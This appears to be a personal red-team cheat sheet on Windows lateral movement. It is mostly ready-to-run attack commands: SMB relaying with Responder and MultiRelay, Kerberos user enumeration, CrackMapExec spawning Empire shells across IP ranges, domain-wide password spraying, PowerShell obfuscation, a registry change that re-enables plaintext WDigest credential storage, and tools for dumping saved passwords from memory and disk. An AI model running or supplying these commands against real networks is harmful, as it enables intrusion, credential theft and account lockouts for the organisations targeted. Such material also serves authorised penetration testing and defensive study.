# Windows lateral movement

## PowerView (https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)

Gain network situational awareness (part of empire), this basically wraps net\* commands.
* `situational_awareness/network/powerview/get_group_member`
* `situational_awareness/network/powerview/get_user`
* `situational_awareness/network/powerview/get_computer`
* `situational_awareness/network/powerview/find_localadmin_access` 

## Bloodhound (https://github.com/BloodHoundAD/Bloodhound)

Get neat ad relationship graph.
* Sharphound (https://github.com/BloodHoundAD/SharpHound) is an ingestor module for bloodhound written in C# which is faster.
* ACL Information via Bloodhound https://wald0.com/?p=112

## SMB-Relaying

* disable smb, http in responder.conf and set respond-to to targetted machines
* run Responder `python Responder -I ethX`
* run MultiRelay `python MultiRelay.py -t <target> -u ALL`
* responder can be used on captured windows targets via [PowerShell Responder](https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh.ps1)

## Empire

* inveigh_relay for SMB-Relaying
* invoke_executemsbuild to execute powershell commands via msbuild on local and remote hosts
* invoke_psremoting
* invoke_sqloscmd
* xp_cmdshell
* invoke_wmi
* jenkins_script_console
* invoke_dcom
* invoke_psexec
* invoke_smbexec
* invoke_sshcommand
* invoke_wmi_debugger (debug remote target)
* new_gpo_immediate_task

## Domain user enumeration

Get users via kerberos: 
```
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm="<realmname>",userdb=<localuserlist> <dc ip>
```

## Find where users can log into:

* start empire `./empire --rest --password <pass>`
* change CrackMapExec password in `/root/.cme/cme.conf`
* run cme to spawn shells `cme smb <iprange> -d <domain> -u <username> -p <password> -M empire_exec -o LISTENER=http`


## Shotgun / [Spray](https://github.com/SpiderLabs/Spray)

Sprays password against every user in a domain, for example via owa.
`./spray.sh -owa <ip> <userlist> <passlist> <attemptsperperiod> <lockoutperiod> <domain>`

## Execute powershell through .net with [NoPowerShell](https://github.com/trustedsec/nps_payload)

## Obfuscate Powershell

* hideMyPS (https://github.com/cheetz/hidemyps)

## [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester.git)

* `systeminfo` -> `./python ./windows-exploit-suggester.py -i ./windows.txt -d name.xls`


## Activate LSASS Password storage on windows 10

`reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f` 
(this will require user to login again)

## Extract credentials
[Mimikittenz](https://github.com/putterpanda/mimikittenz.git)
Uses ReadProcessMemory() in order to extract plaintext passwords from target processes such as browsers. (Office365, Outlook, Jira, Github, Bugzilla, Zendisk, Cpanel, Dropbox, Twitter, Facebook, ...)

[LaZagne](https://github.com/AlessandroZ/LaZagne)
Similar to mimikittenz but gets passwords from filesystem instead of ram.

[SessionGopher](https://github.com/fireeye/SessionGopher)
PowerShell-Script that grabs hostnames and saved passwords

From Windows Credential Store:
* Gathering Web Credentials (https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
* Gathering Windows Credentials (https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1)


tags: empire relaying bloodhound powerview